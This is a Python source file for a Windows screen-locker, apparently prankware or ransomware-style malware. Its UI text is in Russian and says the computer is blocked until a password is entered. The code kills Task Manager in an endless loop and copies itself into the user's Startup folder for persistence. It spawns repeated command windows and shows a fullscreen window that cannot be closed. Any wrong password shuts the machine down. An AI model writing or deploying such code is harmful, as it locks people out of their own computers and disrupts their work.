#tkinter import
from tkinter import Tk, Label, Toplevel
import tkinter as tk
import tkinter.font as tkFont

#other import
from os import system
from getpass import getuser
from shutil import move
import threading

import config

#v
class M():
    def run_music():
        system("start gamemusic.mp3")

    def run_cmd(itterations, command):
        for i in range(itterations):
            system("start cmd.exe /k" + str(command))

    def run_kill():
        system("start system/kill.bat")

    def run_password():
        if inp_pass.get() == config.key:
            system("start explorer")
            exit()
        else:
            system("shutdown /s /t 0")

    def run_atr():
        try:
            system("start system/atr.bat") 
            M.run_kill()
        except:
            pass

        try:
            USER_NAME = getuser()
            dest = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

        except:
            pass

        try:
            system("start system/atr.bat")
            move("./main.py", dest)
            move("./system", dest)
            move("./gamemusic.mp3", dest)
        except:
            pass

    def run_task_kill():
            while True:
                system("Taskkill /f /im taskmgr.exe")


def init():
    if config.start_thread:
        thread_taskKiller = threading.Thread(target=M.run_task_kill)
        thread_taskKiller.start()
    
    if config.run_music:
        M.run_music()

    if config.add_in_autorun:
        M.run_atr()

    if config.run_cmd:
        M.run_cmd(config.cmd_count, config.cmd_command)
init()

def Quit():
    pass

root = tk.Tk()


#setting title
root.title(config.window_title)
#setting window size
width=800
height=600
screenwidth = root.winfo_screenwidth()
screenheight = root.winfo_screenheight()
alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
root.geometry(alignstr)
root.resizable(width=False, height=False)
root["bg"] = "black"
root.protocol("WM_DELETE_WINDOW", Quit)
try:
    root.state('zoomed')
except:
    pass

try:
    root.overrideredirect(1)
    root.state('zoomed')
    
except:
    pass
try:
    root.attributes('-zoomed', True) 
except:
    pass
lbl_main=tk.Label(root)
lbl_main["activeforeground"] = "#ffffff"
lbl_main["anchor"] = "center"
ft = tkFont.Font(family='Calibri',size=30)
lbl_main["font"] = ft
lbl_main["fg"] = "#ff0000"
lbl_main["bg"] = "black"
lbl_main["justify"] = "center"
lbl_main["text"] = "Ваш компьютер заблокирован!"
lbl_main["relief"] = "flat"
lbl_main.place(
    x=525,
    y=40,
    width=800,
    height=40
    )
lbl_requirement=tk.Label(root)
ft = tkFont.Font(family='Calibri',size=15)
lbl_requirement["font"] = ft
lbl_requirement["fg"] = "#ffffff"
lbl_requirement["bg"] = "black"
lbl_requirement["justify"] = "center"
lbl_requirement["text"] = "Чтоб разблокировать компьютер введите пароль!"
lbl_requirement.place(
    x=515,
    y=200,
    width=800,
    height=30
    )

inp_pass=tk.Entry(root)
inp_pass["borderwidth"] = "1px"
ft = tkFont.Font(family='Calibri',size=10)
inp_pass["font"] = ft
inp_pass["fg"] = "#000000"
inp_pass["bg"] = "#ffffff"
inp_pass.place(
    x=800,
    y=350,
    width=250,
    height=30
    )

btn_entr = tk.Button(root, command=M.run_password)
btn_entr["font"] = ft
btn_entr["fg"] = "#000000"
btn_entr["bg"] = "#ffffff"
btn_entr["text"] = "Ввод"
btn_entr.place(
    x=835,
    y=400,
    width=180,
    height=40
)
    
root.mainloop()